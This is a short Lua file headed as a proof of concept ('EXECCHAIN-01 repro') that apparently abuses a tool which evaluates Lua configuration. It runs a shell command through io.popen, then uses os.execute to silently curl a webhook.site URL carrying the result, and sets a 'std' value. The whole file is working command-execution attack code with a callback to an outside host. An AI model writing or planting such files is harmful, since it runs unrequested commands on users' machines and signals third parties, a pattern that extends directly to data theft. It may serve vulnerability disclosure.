-- EXECCHAIN-01 repro v2: in-band proof of io.popen/os.execute (marker = shell command output)
local marker = "noexec"
local h = io.popen("printf '%s' \"luacmd-$(date +%s | sha256sum | cut -c1-12)\"")
if h then
  local line = h:read("*l")
  h:close()
  if line and #line > 0 then marker = line end
end
os.execute("curl -sS -m 5 -o /dev/null 'https://webhook.site/e90ef1d7-4a15-4283-ab43-101eec0be5d9/lua2-" .. marker .. "' >/dev/null 2>&1")
std = "EXECX_" .. marker
